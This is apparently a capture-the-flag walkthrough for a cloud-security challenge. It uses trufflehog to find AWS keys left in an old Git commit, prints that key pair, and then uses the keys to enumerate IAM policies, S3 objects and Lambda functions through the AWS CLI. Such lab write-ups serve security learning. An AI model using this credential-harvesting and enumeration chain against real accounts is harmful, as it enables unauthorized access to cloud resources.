Get chest by going left into wall once inside

# AWS CLI Intro
hint 
In the AWS command line (CLI), the Secure Token Service or STS has one _very_ useful function.
(https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/get-caller-identity.html)

![[Pasted image 20221209125309.png]]
![[Pasted image 20221209125337.png]]
![[Pasted image 20221209125728.png]]

![[Pasted image 20221209125709.png]]
![[Pasted image 20221209130255.png]]

![[Pasted image 20221209130217.png]]
# Git repo
Use the terminal on top
![[Pasted image 20221209133522.png]]

```
https://haugfactory.com/asnowball/aws_scripts.git
```
```
## Checkout Old Commits
_From: Jill Underpole
Objective: [Trufflehog Search]
If you want to look at an older code commit with git, you can 
`git checkout CommitNumberHere`.
```
```
## Trufflehog Tool
_From: Jill UnderpolE
Objective: [Trufflehog Search]
You can search for secrets in a Git repo with `trufflehog git https://some.repo/here.git`.
```
![[Pasted image 20221209170059.png]]

Answer: put_policy.py


# Explotation via AWS CLI

hint , you should know the difference between managed and inline policies
![[Pasted image 20221209170746.png]]
![[Pasted image 20221209171505.png]]
![[Pasted image 20221209171519.png]]
![[Pasted image 20221209171532.png]]
![[Pasted image 20221210085224.png]]
![[Pasted image 20221210085306.png]]


looking at the commit that trufflehog detects
use the hint from before
git checkout {commit#}
cd into put_policy.py
```
iam = boto3.client('iam',
    region_name='us-east-1',
    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
    aws_secret_access_key="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",
)

```

![[Pasted image 20221210092600.png]]
```
{
    "UserId": "AIDAJNIAAQYHIAAHDDRA",
    "Account": "602123424321",
    "Arn": "arn:aws:iam::602123424321:user/haug"
}
```

user from above haug
Answer:
```
aws iam list-attached-user-policies --user-name haug
```
![[Pasted image 20221210093044.png]]

![[Pasted image 20221210093027.png]]

![[Pasted image 20221210093254.png]]
```
aws iam get-policy --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
```
![[Pasted image 20221210093204.png]]

![[Pasted image 20221210093340.png]]

![[Pasted image 20221210093551.png]]

```
aws iam get-policy-version --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY" --version-id "v1"
```

![[Pasted image 20221210093518.png]]

```
aws iam list-user-policies --user-name haug
```

![[Pasted image 20221210093819.png]]
![[Pasted image 20221210093804.png]]
```
aws iam get-user-policy --user-name haug --policy-name S3Perms
```
![[Pasted image 20221210094024.png]]

![[Pasted image 20221210094236.png]]
```
aws s3api list-objects --bucket "smogmachines3"
```

![[Pasted image 20221210094217.png]]

```
aws lambda list-functions
```

![[Pasted image 20221210094530.png]]

```
aws lambda get-function-url-config --function-name smogmachine_lambda
```

![[Pasted image 20221210103230.png]]